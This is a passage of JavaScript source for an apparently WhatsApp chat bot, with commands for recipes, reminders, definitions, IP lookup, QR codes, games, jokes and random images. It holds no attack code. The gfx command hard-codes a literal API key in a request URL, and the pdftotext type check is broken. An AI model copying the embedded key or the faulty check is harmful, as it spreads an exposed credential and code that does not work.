        const msg = `🍽 Recipe: ${meal.strMeal}\nCategory: ${meal.strCategory}\nCuisine: ${meal.strArea}\n\nIngredients:\n${Array.from({length:20}).map((_,i)=>meal[`strIngredient${i+1}`] ? `${meal[`strIngredient${i+1}`]} - ${meal[`strMeasure${i+1}`]}` : '').filter(Boolean).join("\n")}\n\nInstructions:\n${meal.strInstructions}`;
        await HeavstalTech.sendMessage(m.chat, { text: msg }, { quoted: m });
    } catch {
        Vreply("Failed to fetch recipe.");
    }
}
break;
//=================================================//


//=================================================//
case "remind": 
case "reminder": {
    if (!text) return Vreply(`Usage: remind <seconds> <message>. Example: ${prefix}remind 60 Take a break`);
    const [sec, ...msgArr] = text.split(" ");
    const msgText = msgArr.join(" ");
    const delay = parseInt(sec) * 1000;
    if (isNaN(delay) || !msgText) return Vreply(" Invalid usage.");
    await Vreply(`⏰ Reminder set for ${sec} seconds.`);
    setTimeout(() => {
        HeavstalTech.sendMessage(m.chat, { text: `⏰ Reminder: ${msgText}` });
    }, delay);
}
break;
//=================================================//



//=================================================//
case "define": {
    if (!text) return Vreply(`Provide a word to define. Example: ${prefix}define computer`);
    try {
        const response = await fetch(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
        const data = await response.json();
        const meanings = data[0].meanings[0].definitions[0].definition;
        await HeavstalTech.sendMessage(m.chat, { text: `📖 ${text}:\n${meanings}` }, { quoted: m });
    } catch {
        Vreply("Could not find definition.");
    }
}
break;
//=================================================//


//=================================================//
case "currency": {
    if (!text) return Vreply(`Usage: currency <amount> <from> <to>\nExample: ${prefix}currency 100 USD NGN`);
    const [amount, from, to] = text.split(" ");
    if (!amount || !from || !to) return Vreply(" Missing arguments!");

    try {
        const response = await fetch(`https://api.exchangerate.host/convert?from=${from.toUpperCase()}&to=${to.toUpperCase()}&amount=${amount}`);
        const data = await response.json();
        await HeavstalTech.sendMessage(m.chat, { text: `💱 ${amount} ${from.toUpperCase()} = ${data.result} ${to.toUpperCase()}` }, { quoted: m });
    } catch (e) {
        Vreply("Failed to convert currency.");
    }
}
break;
//=================================================//


//=================================================//
case 'ip':
case 'ipinfo': {
    if (!text) return Vreply(`*Please Provide an IP*\n\nExample: ${prefix + command} 8.8.8.8`);
    Vreply(mess.wait)
await loading(); // kill it if you don't have

    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/ip-info', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ ip: text.trim() })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const data = res.data;
            const ipDetails = `*🌍 IP Geo-Location Info*\n\n` +
                              `📌 *IP/Domain:* ${data.ip}\n` +
                              `🏢 *ISP/Org:* ${data.org}\n` +
                              `🏙️ *City:* ${data.city}\n` +
                              `📍 *Region:* ${data.region}\n` +
                              `🏳️ *Country:* ${data.country}\n` +
                              `🕒 *Timezone:* ${data.timezone}\n\n` +
                              `🗺️ *Google Maps:* ${data.map}\n\n`;

            await HeavstalTech.sendMessage(m.chat, {
                text: ipDetails,
                contextInfo: {
                    externalAdReply: {
                        title: `IP Location: ${data.country}`,
                        body: `Tracking ${data.ip}`,
                        thumbnailUrl: "https://files.catbox.moe/g8pxls.png", // replace with your bot image
                        sourceUrl: data.map,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        } else {
            await Vreply(`* Failed To Fetch IP Info*\n\nCould not fetch details for "${text}". Please ensure it is a valid IP`);
        }
    } catch (e) {
        console.error("IP Info Error:", e);
        Vreply(`*Error:* An unexpected error occurred while connecting to Heavstal Tech.`);
    }
}
break;
//=================================================//


//=================================================//
case "readqr": {
    if (!m.quoted || !m.quoted.image) return Vreply("Reply to an image containing a QR code.");
    const buffer = await m.quoted.download();
    try {
        const formData = new FormData();
        formData.append('file', new Blob([buffer]), 'qr.png');

        const response = await fetch("https://api.qrserver.com/v1/read-qr-code/", {
            method: "POST",
            body: formData
        });
        const data = await response.json();
        const qrText = data[0].symbol[0].data;

        if (!qrText) return Vreply("Could not detect a valid QR code in that image.");
        await HeavstalTech.sendMessage(m.chat, { text: `📱 QR Code Content:\n${qrText}` }, { quoted: m });
    } catch (e) {
        Vreply("Failed to read QR code.");
    }
}
break;
//=================================================//


//=================================================//
case "wiki": 
case "wikipedia": {
    if (!text) return Vreply("Provide a search term. Example: wiki JavaScript");
    try {
        const response = await fetch(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`);
        const data = await response.json();
        if (data.title === "Not found.") return Vreply("Result not found.");
        await HeavstalTech.sendMessage(m.chat, { text: `📚 ${data.title}\n\n${data.extract}` }, { quoted: m });
    } catch {
        Vreply("Failed to fetch from Wikipedia.");
    }
}
break;
//=================================================//


//=================================================//
case 'qrcode':
case 'qr':
case 'generateqr': {
    if (!text) return Vreply(`*Please Provide Text or URL to Encode*\n\nExample: ${prefix + command} https://google.com`);
    Vreply(mess.wait)
       await loading(); // kill it if you don't have

    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/qrcode', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ 
                text: text.trim(),
            })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data && res.data.link) {
            await HeavstalTech.sendMessage(m.chat, {
                image: { url: res.data.link },
                caption: `*✅ QR Code Generated*\n\n*Content:* ${res.data.text}\n\n${footer}`
            }, { quoted: m });
        } else {
            await Vreply(`*Generation Failed*\n\nCould not generate QR code. Please try again.`);
        }
    } catch (e) {
        console.error("QR Code Error:", e);
        Vreply(`*Error:* An unexpected error occurred while connecting to Heavstal Tech.`);
    }
}
break;
//=================================================//


//=================================================//
case "pdftotext": {   
    if (!m.quoted || !m.quoted.fileName?.endsWith(".pdf")) return Vreply("❌ Reply to a PDF file.");
    const pdfBuffer = await HeavstalTech.downloadAndSaveMediaMessage(quoted);
    if (pdfParse !== typeof "function") return Vreply(mess.error.fitur);
    const pdf = await pdfParse(pdfBuffer);
    await HeavstalTech.sendMessage(m.chat, { text: `📄 PDF Text:\n\n${pdf.text}` }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case 'ttc':
case 'ttt':
case 'tictactoe': {
                const { TicTacToe } = require(path.join(__dirname, '..', 'lib', 'game.js'));
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return Vreply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    Vreply('partner detected...!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

First ✅: @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await HeavstalTech.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await HeavstalTech.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    Vreply('Waiting for partner type .tictactoe to join' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break;
//=================================================//
         
      
//=================================================//
case 'wordchain':
case 'wchain':
case 'chainword': 
case 'wcg': {
    const { WordChain } = require(path.join(__dirname, '..', 'lib', 'game.js'));
    if (!m.isGroup) return Vreply(mess.only.group);
    
    const action = args[0] ? args[0].toLowerCase() : '';

    if (action === 'start' || action === 'on') {
        if (global.wordChainGames.has(from)) return Vreply(`⚠️ A Word Chain game is already running! Use *${prefix + command} stop* to end it.`);
        
        const game = new WordChain(m.sender);
        global.wordChainGames.set(from, game);
        
        await HeavstalTech.sendMessage(from, {
            text: `╭━━━━━━━━━━━━━━━╮\n│ 🔗 *HARDCORE WORD CHAIN*\n├━━━━━━━━━━━━━━━┤\n│ @${m.sender.split("@")[0]} started a game!\n│\n│ 📜 *RULES:*\n│ • Must start with the last \n│   letter of the previous word.\n│ • No repeated words.\n│ • Must be valid English.\n│ • *WARNING:* Time limits\n│   and Min-Length requirements\n│   get harder as you play!\n│\n│ ⏱️ 30 seconds to join\n│ 👥 Type *join* to play!\n│ Use *${prefix + command} stop* to end the game!\n╰━━━━━━━━━━━━━━━╯`,
            mentions: [m.sender]
        }, { quoted: m });
        
        // Join phase timer
        setTimeout(async () => {
            const g = global.wordChainGames.get(from);
            if (!g || !g.joinPhase) return;
            
            if (g.players.length < 2) {
                global.wordChainGames.delete(from);
                return HeavstalTech.sendMessage(from, { text: "❌ Word Chain cancelled - need at least 2 players to start!" });
            }
            
            const firstPlayer = g.startGame();
            const playerList = g.players.map((p, i) => `${i + 1}. @${p.id.split("@")[0]}`).join("\n");
            
            await HeavstalTech.sendMessage(from, {
                text: `╭━━━━━━━━━━━━━━━╮\n│ 🔗 *WORD CHAIN STARTS!*\n├━━━━━━━━━━━━━━━┤\n│ 👥 *Players:*\n${playerList}\n├━━━━━━━━━━━━━━━┤\n│ 🎮 @${firstPlayer.id.split("@")[0]} goes first!\n│ 🔤 Start with ANY word\n│ 📏 Min Length: *${g.minWordLength} letters*\n│ ⏱️ ${g.timeLimit} seconds\n╰━━━━━━━━━━━━━━━╯`,
                mentions: g.players.map(p => p.id)
            });
            
            // Start turn timer
            startWordChainTimer(HeavstalTech, from, g);
        }, 30000);

    } else if (action === 'stop' || action === 'off') {
        const game = global.wordChainGames.get(from);
        if (!game) return Vreply("❌ No Word Chain game is running.");
        
        if (game.host !== m.sender && !isAdmin && !isCreator) {
            return Vreply("❌ Only the host or an Admin can stop the game!");
        }
        
        if (game.turnTimeout) clearTimeout(game.turnTimeout);
        
        const sortedPlayers = [...game.players].sort((a, b) => b.score - a.score);
        let scoresText = "";
        const mentions =[];
        
        sortedPlayers.forEach((p, i) => {
            mentions.push(p.id);
            const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "▪️";
            scoresText += `${medal} @${p.id.split("@")[0]} → ${p.score} pts\n`;
        });
        
        await HeavstalTech.sendMessage(from, {
            text: `╭━━━━━━━━━━━━━━━╮\n│ 🔗 *WORD CHAIN - STOPPED*\n├━━━━━━━━━━━━━━━┤\n│ 🛑 Game force-stopped.\n├━━━━━━━━━━━━━━━┤\n│ 📊 *CURRENT SCORES:*\n${scoresText}│ 📝 Total chain: ${game.chainLength} words\n╰━━━━━━━━━━━━━━━╯`,
            mentions
        });
        
        global.wordChainGames.delete(from);

    } else {
        // If they just type .wcg without start/stop
        return Vreply(`*🕹️ Word Chain Game*\n\n*Usage:*\n${prefix + command} start - Starts a new game\n${prefix + command} stop - Ends the current game\n\n${footer}`);
    }
}
break;
//=================================================//

        
//=================================================//    
            case 'delttc':
            case 'delttt': 
            case 'delete-tictactoe': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        HeavstalTech.sendText(m.chat, `Successfully delete TicTacToe session`, m)
                    } else if (!this.game) {
                        Vreply(`Session TicTacToe🎮 Session is missing`)
                    } else Vreply('?')
                } catch (e) {
                    Vreply('error')
                }
            }
            break;        
//=================================================//



//=================================================//
case "coinbattle": 
case "coin-battle": {
    const userFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    const botFlip = Math.random() < 0.5 ? "Heads" : "Tails";
    let msg = `🪙 You flipped: ${userFlip}\n🤖 Bot flipped: ${botFlip}\n`;
    msg += userFlip === botFlip ? "🎉 You win!" : "😢 You lose!";
    await HeavstalTech.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case "numberbattle":
case "numbattle":
case "number-battle": {
    const number = Math.floor(Math.random() * 50) + 1;
    if (!text) return Vreply(`❌ Guess a number between 1 and 50. Example: ${prefix}${command} 10`);
    const guess = parseInt(text);
    let msg = `🎯 Your guess: ${guess}\n🎲 Target number: ${number}\n`;
    msg += guess === number ? "🎉 Perfect guess!" : guess > number ? "⬇️ Too high!" : "⬆️ Too low!";
    await HeavstalTech.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case "math": {
    this.game = this.game ? this.game : {};
    if (this.game[m.chat]) return Vreply("⚠️ A game is already running in this chat!");

    const a = Math.floor(Math.random() * 100) + 1;
    const b = Math.floor(Math.random() * 100) + 1;
    const operators = ['+', '-', '*'];
    const op = operators[Math.floor(Math.random() * operators.length)];
    
    let result;
    if (op === '+') result = a + b;
    if (op === '-') result = a - b;
    if (op === '*') result = a * b;

    Vreply(`*🔢 MATH CHALLENGE*\n\nSolve: *${a} ${op} ${b}*\n\n⏱️ *Time Limit:* 15 Seconds\n💰 *Reward:* ₹250\n\n_Type the answer directly!_`);

    this.game[m.chat] = {
        type: 'math',
        answer: result,
        timeout: setTimeout(() => {
            if (this.game[m.chat]) {
                HeavstalTech.sendMessage(m.chat, { text: `⏰ *TIME'S UP!*\n\nThe correct answer was *${result}*.\nBetter luck next time!` });
                delete this.game[m.chat];
            }
        }, 15000)
    };
}
break;
//=================================================//

//=================================================//
case "emojiquiz": {
    this.game = this.game ? this.game : {};
    if (this.game[m.chat]) return Vreply("⚠️ A game is already running in this chat!");

    const quizzes = [
        { emoji: "🐍", answer: "snake" }, { emoji: "🍎", answer: "apple" }, { emoji: "🏎️", answer: "car" },
        { emoji: "🎸", answer: "guitar" }, { emoji: "🏠", answer: "house" }, { emoji: "🦠", answer: "bug" },
        { emoji: "🐌", answer: "snail" }, { emoji: "🦓", answer: "zebra" }, { emoji: "🎁", answer: "gift" },
        { emoji: "🐒", answer: "monkey" }, { emoji: "🧊", answer: "ice" }, { emoji: "🍿", answer: "popcorn" },
        { emoji: "👻", answer: "ghost" }, { emoji: "🧽", answer: "sponge" }, { emoji: "🧲", answer: "magnet" },
        { emoji: "🔔", answer: "bell" }, { emoji: "🇳🇬", answer: "nigeria" }, { emoji: "🇮🇱", answer: "israel" },
        { emoji: "🍪", answer: "cookie" }, { emoji: "🍔", answer: "hamburger" }, { emoji: "🍕", answer: "pizza" },
        { emoji: "🧀", answer: "cheese" }, { emoji: "🥚", answer: "egg" }, { emoji: "🥜", answer: "grandnut" },
        { emoji: "🍞", answer: "bread" }, { emoji: "🥑", answer: "avocado" }, { emoji: "🥦", answer: "mushroom" },
        { emoji: "🌽", answer: "corn" }, { emoji: "🧅", answer: "onion" }, { emoji: "🥕", answer: "carrot" },
        { emoji: "🌶️", answer: "peppe" }, { emoji: "🍅", answer: "tomato" }, { emoji: "🍇", answer: "grape" },
        { emoji: "🍌", answer: "banana" }, { emoji: "🍍", answer: "pineapple" }, { emoji: "🍉", answer: "watermelon" },
        { emoji: "🦁", answer: "lion"}, { emoji: "🐬", answer: "dolphin"}, { emoji: "🦉", answer: "owl"},
        { emoji: "🐘", answer: "elephant"}, { emoji: "🐼", answer: "panda"}, { emoji: "🦋", answer: "butterfly"},
        { emoji: "🐝", answer: "bee"}, { emoji: "🦖", answer: "dinosaur"}, { emoji: "🚀", answer: "rocket"},
        { emoji: "🛸", answer: "ufo"}, { emoji: "🧸", answer: "teddy"}, { emoji: "🎮", answer: "game"},
        { emoji: "📱", answer: "phone"}, { emoji: "💡", answer: "light"}, { emoji: "🕯️", answer: "candle"},
        { emoji: "🛏️", answer: "bed"}, { emoji: "🪑", answer: "chair"}, { emoji: "🧼", answer: "soap"},
        { emoji: "🪞", answer: "mirror"}, { emoji: "🪜", answer: "ladder"}, { emoji: "🧹", answer: "broom"},
        { emoji: "🪠", answer: "plunger"}, { emoji: "🧻", answer: "tissue"}, { emoji: "🪤", answer: "trap"},
        { emoji: "🧯", answer: "extinguisher"}, { emoji: "🪓", answer: "axe"}, { emoji: "🪙", answer: "coin"},
        { emoji: "🧭", answer: "compass"}, { emoji: "🪁", answer: "kite"}, { emoji: "🪃", answer: "boomerang"}
    ];

    const quiz = quizzes[Math.floor(Math.random() * quizzes.length)];

    Vreply(`*🧩 EMOJI QUIZ*\n\nGuess the name of this object:\n${quiz.emoji}\n\n⏱️ *Time Limit:* 15 Seconds\n💰 *Reward:* ₹500\n\n_Type the answer directly!_`);

    this.game[m.chat] = {
        type: 'emojiquiz',
        answer: quiz.answer,
        timeout: setTimeout(() => {
            if (this.game[m.chat]) {
                HeavstalTech.sendMessage(m.chat, { text: `⏰ *TIME'S UP!*\n\nThe correct answer was *${quiz.answer}*.\nNo rewards this time!` });
                delete this.game[m.chat];
            }
        }, 15000)
    };
}
break;
//=================================================//

//=================================================//
case "dice": {
    const roll = Math.floor(Math.random() * 6) + 1;
    await HeavstalTech.sendMessage(m.chat, { text: `🎲 You rolled a ${roll}!` }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case "rpsls": {  
    if (!text) return Vreply(`❌ Choose rock, paper, scissors, lizard, or spock. Example: ${prefix}rpsls spock`);
    const choices = ["rock", "paper", "scissors", "lizard", "spock"];
    const userChoice = text.toLowerCase();
    if (!choices.includes(userChoice)) return Vreply("❌ Invalid choice! Use rock, paper, scissors, lizard, or spock.");

    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    const winMap = {
        rock: ["scissors", "lizard"],
        paper: ["rock", "spock"],
        scissors: ["paper", "lizard"],
        lizard: ["spock", "paper"],
        spock: ["scissors", "rock"]
    };

    let result = "";
    if (userChoice === botChoice) result = "🤝 It's a tie!";
    else if (winMap[userChoice].includes(botChoice)) result = "🎉 You win!";
    else result = "😢 You lose!";

    await HeavstalTech.sendMessage(
        m.chat,
        { text: `🪨 You chose: ${userChoice}\n🤖 Bot chose: ${botChoice}\n\n${result}` },
        { quoted: m }
    );
}
break;
//=================================================//


//=================================================//
case "coin": {    
    const result = Math.random() < 0.5 ? "🪙 Heads" : "🪙 Tails";
    await HeavstalTech.sendMessage(m.chat, { text: `🎲 Coin Flip Result: ${result}` }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case "gamefact": 
case "game-fact": {
    try {
        const response = await fetch("https://www.freetogame.com/api/games");
        const games = await response.json();
        const game = games[Math.floor(Math.random() * games.length)];
        await HeavstalTech.sendMessage(m.chat, { 
            text: `*Game:* ${game.title}\nGenre: ${game.genre}\n*Platform:* ${game.platform}\n*More Info:* ${game.game_url}` 
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        Vreply("❌ Failed to fetch a game fact.");
    }
}
break;
//=================================================//


//=================================================//
case "fox": 
case "koala": 
case "bird": 
case "panda": {
    try {
        let api, key, emoji;
        switch (command) {
            case "fox":
                api = "https://randomfox.ca/floof/";
                key = "image";
                emoji = "🦊";
                break;
            case "koala":
                api = "https://some-random-api.com/img/koala";
                key = "link";
                emoji = "🐨";
                break;
            case "bird":
                api = "https://some-random-api.com/img/birb";
                key = "link";
                emoji = "🐦";
                break;
            case "panda":
                api = "https://some-random-api.com/img/panda";
                key = "link";
                emoji = "🐼";
                break;
        }

        const response = await fetch(api);
        const data = await response.json();
        const img = data[key];

        if (!img) return Vreply(`❌ Failed to fetch ${command} image.`);

        await HeavstalTech.sendMessage(m.chat, { 
            image: { url: img }, 
            caption: `*${emoji} Random ${command.charAt(0).toUpperCase() + command.slice(1)}!*` 
        }, { quoted: m });
    } catch (e) {
        console.error(`${command.toUpperCase()} ERROR:`, e);
        Vreply(`❌ An error occurred.`);
    }
}
break;
//=================================================//

        
//=================================================//
case "funfact":
case "fact2": {
    try {
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/funfact', {
            method: 'POST',
            headers: { 'x-api-key': HT_API_KEY }
        });
        const res = await response.json();

        if (res.status === 'success' && res.data) {
            await HeavstalTech.sendMessage(m.chat, { 
                text: `💡 *Fun Fact [${res.data.category}]*\n\n${res.data.fact}\n\n${footer}` 
            }, { quoted: m });
        } else {
            Vreply("❌ Failed to fetch a fun fact from Heavstal API.");
        }
    } catch (e) {
        console.error("FUNFACT ERROR:", e);
        Vreply("❌ An unexpected error occurred.");
    }
}
break;
//=================================================//


//=================================================//
case "quotememe":
case "prog":
case "dev-joke":
case "dadjoke":
case "dad-joke":
case "progquote":
case "dev-quote":
case "ascii":
case "advice": {
    try {
        let api, options = {}, isJson = true;
        
        switch (command) {
            case "quotememe":
                api = "https://api.quotable.io/random";
                break;
            case "prog":
            case "dev-joke":
                api = "https://v2.jokeapi.dev/joke/Programming?type=single";
                break;
            case "dadjoke":
            case "dad-joke":
                api = "https://icanhazdadjoke.com/";
                options = { headers: { 'Accept': 'application/json' } };
                break;
            case "progquote":
            case "dev-quote":
                api = "https://programming-quotes-api.herokuapp.com/quotes/random";
                break;
            case "ascii":
                if (!text) return Vreply(`❌ Provide text. Example: ${prefix + command} Heavstal`);
                api = `https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`;
                isJson = false;
                break;
            case "advice":
                api = "https://api.adviceslip.com/advice";
                break;
        }

        const response = await fetch(api, options);
        const data = isJson ? await response.json() : await response.text();
        let resultText = "";

        if (command === "quotememe") resultText = `🖋️ "${data.content}"\n— ${data.author}`;
        else if (command === "prog" || command === "dev-joke") resultText = `💻 *Programming Joke:* ${data.joke}`;
        else if (command === "dadjoke" || command === "dad-joke") resultText = `🧔 *Dad Joke:* ${data.joke}`;
        else if (command === "progquote" || command === "dev-quote") resultText = `👨‍💻 "${data.en}"\n— ${data.author}`;
        else if (command === "ascii") resultText = `🎨 *ASCII Art:*\n\n\`\`\`${data}\`\`\``;
        else if (command === "advice") resultText = `💡 *Advice:* ${data.slip.advice}`;

        await HeavstalTech.sendMessage(m.chat, { text: resultText }, { quoted: m });
    } catch (e) {
        console.error(`${command.toUpperCase()} ERROR:`, e);
        Vreply(`❌ Failed to fetch ${command}.`);
    }
}
break;
//=================================================//


//=================================================//
case "guess": {     
    const number = Math.floor(Math.random() * 10) + 1; // 1–10
    if (!text) return Vreply("❌ Guess a number between 1 and 10. Example: guess 7");
    const guess = parseInt(text);
    if (isNaN(guess) || guess < 1 || guess > 10) return Vreply("❌ Invalid number! Choose 1–10.");
    
    let msg = `*🎯 You guessed:* ${guess}\n*🤖 Bot chose:* ${number}\n`;
    msg += guess === number ? "🎉 You guessed it! Congrats!" : "😢 Wrong guess! Try again.";
    await HeavstalTech.sendMessage(m.chat, { text: msg }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case "dictionary":
case "moviequote":
case "movie-quote":
case "triviafact":
case "trivia-fact":
case "inspire":
case "compliment": {
    try {
        let resultText = "";
        if (command === "dictionary") {
            if (!text) return Vreply(`❌ Provide a word to search. Example: ${prefix + command} Technology`);
            const res = await (await fetch(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(text)}`)).json();
            if (!res.list?.length) return Vreply("❌ No definition found.");
            const top = res.list[0];
            resultText = `📖 *Word:* ${top.word}\n\n*Definition:* ${top.definition}\n\n*Example:* ${top.example}`;
        } else if (command === "moviequote" || command === "movie-quote") {
            const res = await (await fetch("https://movie-quote-api.herokuapp.com/v1/quote/")).json();
            resultText = `🎬 "${res.quote}"\n— ${res.show || "Unknown"}`;
        } else if (command === "triviafact" || command === "trivia-fact") {
            const res = await (await fetch("https://uselessfacts.jsph.pl/random.json?language=en")).json();
            resultText = `🧠 *Trivia Fact:* ${res.text}`;
        } else if (command === "inspire") {
            const res = await (await fetch("https://type.fit/api/quotes")).json();
            const q = res[Math.floor(Math.random() * res.length)];
            resultText = `🌟 "${q.text}"\n— ${q.author?.split(',')[0] || "Unknown"}`;
        } else if (command === "compliment") {
            const res = await (await fetch("https://complimentr.com/api")).json();
            resultText = `💖 ${res.compliment}`;
        }
        await HeavstalTech.sendMessage(m.chat, { text: resultText }, { quoted: m });
    } catch (e) {
        console.error(`${command.toUpperCase()} ERROR:`, e);
        Vreply(`❌ Failed to fetch ${command}.`);
    }
}
break;
//=================================================//

        
//=================================================//
case "dog":
case "cat": {
    try {
        let api, emoji;
        if (command === "dog") {
            api = "https://dog.ceo/api/breeds/image/random";
            emoji = "🐶";
        } else {
            api = "https://api.thecatapi.com/v1/images/search";
            emoji = "🐱";
        }

        const response = await fetch(api);
        const data = await response.json();
        const img = command === "dog" ? data.message : data[0].url;

        if (!img) return Vreply(`❌ Could not fetch ${command} image.`);

        await HeavstalTech.sendMessage(m.chat, { 
            image: { url: img }, 
            caption: `*${emoji} Random ${command.charAt(0).toUpperCase() + command.slice(1)}!*` 
        }, { quoted: m });
    } catch (e) {
        console.error(`${command.toUpperCase()} ERROR:`, e);
        Vreply(`❌ Failed to fetch ${command}.`);
    }
}
break;
//=================================================//


//=================================================//
case "rps": {    
    if (!text) return Vreply(`❌ Choose rock, paper, or scissors. Example: ${prefix}rps rock`);
    const choices = ["rock", "paper", "scissors"];
    const userChoice = text.toLowerCase();
    if (!choices.includes(userChoice)) return Vreply("❌ Invalid choice! Use rock, paper, or scissors.");
    const botChoice = choices[Math.floor(Math.random() * choices.length)];
    let result = "";
    if (userChoice === botChoice) result = "🤝 It's a tie!";
    else if (
        (userChoice === "rock" && botChoice === "scissors") ||
        (userChoice === "paper" && botChoice === "rock") ||
        (userChoice === "scissors" && botChoice === "paper")
    ) result = "🎉 You win!";
    else result = "😢 You lose!";

    await HeavstalTech.sendMessage(
        m.chat,
        { text: `🪨 You chose: ${userChoice}\n🤖 Bot chose: ${botChoice}\n\n${result}` },
        { quoted: m }
    );
}
break;
//=================================================//


//=================================================//
case "8ball": {
    const answers = [
        "It is certain ✅",
        "Without a doubt ✅",
        "You may rely on it ✅",
        "There's a good chance ✅",
        "In due time, *Yes* ✅",
        "It's a sight for sore eyes 🌹👌",
        "👑 As I predicted: YES. (Now bow.)",
        "Ask again later 🤔",
        "Cannot predict now 🤷",
        "We never can tell now, can we? 😅🥀",
        "Lol, I'd rather not say 🗿",
        "Damn, it's foggy, even for me 😶‍🌫️",
        "Don't count on it ❌",
        "My sources say no ❌",
        "Very doubtful ❌",
        "Lol 😂, Keep Hoping",
        "Nah, Find something better to do ❌",
        "You can keep going, but it's a giant maze, I'd say No 🥀",
        "It's a complicated situation 🥲",
        "odds are 20 - 100, seems they're not in your favor kid",
        "Maybe in the afterlife 😂",
        "🙅‍♀️ Absolutely not. (Try again in 5 business years.)",
        "🤡 Maybe, if clowns ran the world. (Oh wait…)",
        "💀 My sources say *you don’t wanna know.*"
    ];
    if (!text) return Vreply(`❌ Ask me a question! Example: ${prefix}8ball Will I get rich?`);
    const answer = answers[Math.floor(Math.random() * answers.length)];
    await HeavstalTech.sendMessage(m.chat, { text: `🎱 Question: ${text}\n📑 Answer: ${answer}` }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case "trivia": {
    this.game = this.game ? this.game : {};
    if (this.game[m.chat]) return Vreply("⚠️ A game is already running!");

    try {
        const response = await fetch("https://opentdb.com/api.php?amount=1&type=multiple");
        const data = await response.json();
        const trivia = data.results[0];
        
        const options = [...trivia.incorrect_answers, trivia.correct_answer].sort(() => Math.random() - 0.5);
        
        let questionText = `*🎯 SOTA TRIVIA CHALLENGE*\n\n`;
        questionText += `*Category:* ${trivia.category}\n`;
        questionText += `*Difficulty:* ${trivia.difficulty.toUpperCase()}\n\n`;
        questionText += `❓ ${trivia.question}\n\n`;
        options.forEach((opt, i) => {
            questionText += `${i + 1}. ${opt}\n`;
        });
        questionText += `\n⏱️ *Time:* 20 Seconds\n💡 Reply with the *Number* (1-${options.length}) of the correct answer!`;

        Vreply(questionText);

        this.game[m.chat] = {
            type: 'trivia',
            correct: trivia.correct_answer,
            options: options,
            timeout: setTimeout(() => {
                if (this.game[m.chat]) {
                    HeavstalTech.sendMessage(m.chat, { text: `⏰ *TIME'S UP!*\n\nThe correct answer was: *${trivia.correct_answer}*` });
                    delete this.game[m.chat];
                }
            }, 20000)
        };
    } catch (e) {
        console.error(e);
        Vreply("❌ Failed to start trivia.");
    }
}
break;
//=================================================//


//=================================================//
case "meme": {
    try {
        const response = await fetch("https://meme-api.com/gimme");
        const data = await response.json();
        if (!data?.url) return Vreply("❌ Could not fetch a meme.");
        await HeavstalTech.sendMessage(m.chat, { 
            image: { url: data.url }, 
            caption: `😂 ${data.title}\n\n${footer}` 
        }, { quoted: m });
    } catch (e) {
        console.error(e);
        Vreply("❌ Failed to fetch a meme.");
    }
}
break;
//=================================================//


//=================================================//
case 'gfx':
case 'gfx2':
case 'gfx3':
case 'gfx4':
case 'gfx5':
case 'gfx6':
case 'gfx7':
case 'gfx8':
case 'gfx9':
case 'gfx10':
case 'gfx11':
case 'gfx12': {   
    const [t1, t2] = text.split('|').map(v => v.trim());
    if (!t1 || !t2) return Vreply(`*${botname} - ɢғx*\n\n*Example:* ${prefix + command} HEAVSTAL | TECH`);

    await HeavstalTech.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
    Vreply(mess.wait);
    await loading();

    try {
        const apiUrl = `https://api.nexoracle.com/image-creating/${command}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(t1)}&text2=${encodeURIComponent(t2)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error();

        await sendImage(apiUrl, `*🎨 GFX GENERATED*\n\n┃━ ${MenuStyle} *Style:* ${command.toUpperCase()}\n┃━ ${MenuStyle} *Requested By:* ${pushname}\n\n${footer}`);
